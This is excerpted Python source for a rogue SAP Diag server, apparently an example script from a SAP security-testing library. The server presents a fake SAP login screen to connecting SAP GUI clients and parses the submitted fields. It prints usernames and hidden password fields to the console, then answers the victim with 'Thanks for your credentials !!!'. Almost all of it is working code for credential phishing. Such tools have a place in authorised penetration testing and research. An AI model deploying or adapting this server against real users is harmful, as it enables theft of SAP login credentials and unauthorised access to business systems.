...
def parse_dynn_chl(raw):
    """Parse a DYNN/CHL (APPL id=5 sid=1) item, yielding (row, col, value, invisible) per field.

    The binary layout is a 23-byte packet header followed by variable-length field
    entries.  Each entry begins with a size byte (inclusive), then an 18-byte
    sub-header whose fields include row (offset 8), big-endian col (offsets 9-10),
    flags (offset 11, bit 0x02 = invisible/password), and data length (offset 14).
    The field value follows immediately after the sub-header.
    """
    HEADER_SIZE  = 23   # fixed packet header before any field entries (bytes 0-22)
    ENTRY_HEADER = 18   # per-entry metadata bytes before the value
    ...
    while offset < len(raw):
        entry_size = raw[offset]
        # Stop if the entry header doesn't fit; the last field may have no null
        # terminator so allow entry_size to reach exactly len(raw).
        if entry_size < ENTRY_HEADER or offset + ENTRY_HEADER >= len(raw):
            break
        flags     = raw[offset + 11]
        row       = raw[offset + 8]
        col       = raw[offset + 9] * 256 + raw[offset + 10]
        dlen      = min(raw[offset + 14], len(raw) - (offset + ENTRY_HEADER))
        invisible = bool(flags & 0x02)
        value     = raw[offset + ENTRY_HEADER : offset + ENTRY_HEADER + dlen]
        yield row, col, value.decode("utf-8", errors="replace"), invisible
        offset += entry_size
...
class SAPDiagServerHandler(SAPNIServerHandler):
    ...
    def make_login_screen(self):
        return [
            ...
            SAPDiagItem(item_value=SAPDiagAreaSize(area_height=22, area_width=84, window_width=84, window_height=22),
                        item_type=16, item_id=12, item_sid=7),
            ...
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[
                SAPDiagMenuEntry(accelerator='D', text=self.session_title, position_1=1,
                                 flag_TERM_VKEY=1, return_code_1=1, flag_TERM_SEL=1,
                                 length=24 + len(self.session_title)),
            ]), item_type=18, item_id=11, item_sid=1),
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[
                SAPDiagMenuEntry(accelerator='', text='New password', virtual_key=5,
                                 return_code_1=5, info='New password', flag_TERM_SEL=1, length=47),
            ]), item_type=18, item_id=11, item_sid=3),
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[
                SAPDiagMenuEntry(accelerator='', text='New password', virtual_key=5,
                                 position_1=1, flag_TERM_SEL=1, length=35),
                SAPDiagMenuEntry(accelerator='', text='Log off', virtual_key=15,
                                 position_1=2, return_code_1=1, flag_TERM_SEL=1, length=30),
            ]), item_type=18, item_id=11, item_sid=4),
            SAPDiagItem(item_value=self.session_title, item_type=16, item_id=12, item_sid=9),
            SAPDiagItem(item_value=SAPDiagDyntAtom(items=[
                SAPDiagDyntAtomItem(field2_text='Client            ', field2_maxnrchars=18, dlg_flag_2=2, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                ...
                SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, atom_length=81, xmlprop_text='<Propertybag><DefaultTooltip>Language</DefaultTooltip></Propertybag>', etype=120, col=20, block=1, row=5),
    ...
    def logoff(self):
        addr = str(self.client_address)
        print("[*] Logging off the client %s" % addr)
        try:
    ...
    def handle_data(self):
        ...
        if self.client_address in self.server.clients and self.server.clients[self.client_address].init:
            print("[*] Already initialized client %s" % addr)
            self.handle_msg()
        else:
            print("[*] Uninitialized client %s" % addr)
            self.handle_init()
    ...
    def handle_init(self):
        ...
        if SAPDiagDP in self.packet:
            ...
            print("[*] Client %s set to initialized (terminal: %s)" % (
                addr, self.server.clients[self.client_address].terminal))
            self.request.send(SAPDiag(compress=0, message=self.make_login_screen()))
        else:
            print("[-] Error during initialization of client %s" % addr)
            self.logoff()
    ...
    def handle_msg(self):
        addr = str(self.client_address)
        print("[*] Received message from client %s" % addr)
        diag = self.packet[SAPDiag]

        if self.server.options.verbose:
            self._dump_items(diag)
        ...
        if okcode_items:
            ...
            if isinstance(okcode, bytes):
                okcode = okcode.decode("utf-8", errors="replace").strip("\x00")
            if okcode == "/i":
                print("[*] Windows closed by the client %s" % addr)
                self.logoff()
                return

        # UI events
        ui_items = diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE")
        if ui_items:
            print("[*] UI Event sent by the client %s" % addr)
            src = ui_items[0].item_value

            if src.valid_functionkey_data:
                if src.event_type == 7 and src.control_type == 10:
                    if src.event_data == 15:
                        print("[*] Logoff sent by the client %s" % addr)
                        self.logoff()
                        return
                    if src.event_data == 0:
                        print("[*] Enter sent by the client %s" % addr)
                        self._handle_credentials(diag)
                        return

            elif src.valid_menu_pos:
                print("[*] Menu event sent by the client %s" % addr)
                return
            else:
                print("[*] Other event sent by the client %s" % addr)
                return

        # Credentials can also arrive without a UI event (SAP GUI for Windows)
        self._handle_credentials(diag)

    def _handle_credentials(self, diag):
        """Extract and print captured credentials, then respond to the client."""
        addr = str(self.client_address)

        fields = self._extract_credentials(diag)
        if fields is not None:
            print("[*] Login request sent by the client %s" % addr)
            print("[*] Input fields:")
            for value, invisible in fields:
                label = "Password field" if invisible else "Regular field"
                print("[*]\t%s:\t%s" % (label, value))
            print("[*] Sending error message to client %s" % addr)
            self.request.send(SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!")))
        else:
            print("[*] Sending error message to client %s" % addr)
            try:
                self.request.send(SAPDiag(compress=0, message=self.make_error_screen(
                    "E: Unable to process your request, try later")))
            except error:
                pass

    def _extract_credentials(self, diag):
        """Return a list of (value, invisible) tuples from DYNN/CHL or DYNT_ATOM items.

        Returns None if no credential items are found.
        SAP GUI for Java uses DYNN/CHL; SAP GUI for Windows uses DYNT_ATOM.
        """
        # SAP GUI for Java
        dynn_items = diag.get_item("APPL", "DYNN", "CHL")
        if dynn_items:
            result = []
            for item in dynn_items:
                for _row, _col, value, invisible in parse_dynn_chl(bytes(item.item_value)):
                    if value.strip():
                        result.append((value, invisible))
        ...
        if atoms:
            ...
            for atom_item in atoms:
                for atom in atom_item.item_value.items:
                    if atom.etype not in (121, 122, 123, 130, 131, 132):
                        continue
                    ...
                    text = text.strip()
                    if text:
                        result.append((text, bool(atom.attr_DIAG_BSD_INVISIBLE)))
            return result if result else None

        return None

    def _dump_items(self, diag):
        print("[*] Items in packet:")
        for item in diag.message:
            val = bytes(item.item_value)
            print("    type=%s id=%s sid=%s len=%d value=%r" % (
                item.item_type, item.item_id, item.item_sid, len(val), val[:200]))
...
def parse_options():
    description = ("This example script implements a rogue server using the Diag protocol. "
